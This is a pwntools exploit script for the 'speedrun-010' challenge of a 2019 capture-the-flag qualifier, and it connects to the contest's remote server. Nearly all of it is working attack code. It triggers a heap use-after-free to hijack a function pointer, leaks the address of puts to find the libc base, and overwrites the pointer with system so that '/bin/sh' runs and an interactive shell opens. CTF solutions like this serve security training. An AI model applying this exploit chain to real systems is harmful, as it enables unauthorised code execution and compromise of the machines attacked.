from pwn import *

conn = remote("speedrun-010.quals2019.oooverflow.io", 31337)
#conn = process("./speedrun-010")

def input_Name(name):
	conn.recvuntil("1, 2, 3, 4, or 5")
	conn.send("1")
	conn.recvuntil("Need a name\n")
	conn.send(name)
	
def Free_Name():
	conn.recvuntil("1, 2, 3, 4, or 5")
	conn.send("3")

def input_Msg(msg):
	conn.recvuntil("1, 2, 3, 4, or 5")
	conn.send("2")
	conn.recvuntil("Need a message\n")
	conn.send(msg)

	
def Free_Msg():
	conn.recvuntil("1, 2, 3, 4, or 5")
	conn.send("4")

puts = 0xc0
input_Name("myria")	# A
input_Msg("test")	# B

"""
B {
	Name* name_0 = null;
	void* func_8 = &puts;
	char  msg_10[32] = "test";
}
"""

# head -> B 
Free_Msg()
input_Name(p8(puts)) 	# B
input_Msg("puts_leak")	# C  
"""
B {
	field_0  = null  // Name* name_0 = null;
	 name_8  = &puts // void* func_8 = &puts;
	field_10 ;       // char  msg_10[32] = "test";
	field_18 ;
	 func_20 = &puts
}
"""
# B->func(B->name) == puts(&puts)
# leak puts
puts_addr = u64(conn.recv(6).ljust(8, "\x00"))
log.info("puts_addr : " + hex(puts_addr))
base_addr = puts_addr - 0x809c0
log.info("base_addr : " + hex(base_addr))

system_addr = base_addr + 0x4f440

uaf_msg2name  = "A"*0x10
uaf_msg2name += p64(system_addr)

input_Name("/bin/sh\x00") 	# D 
Free_Name() # D 
input_Msg(uaf_msg2name) 	# D Name->func => system

conn.interactive()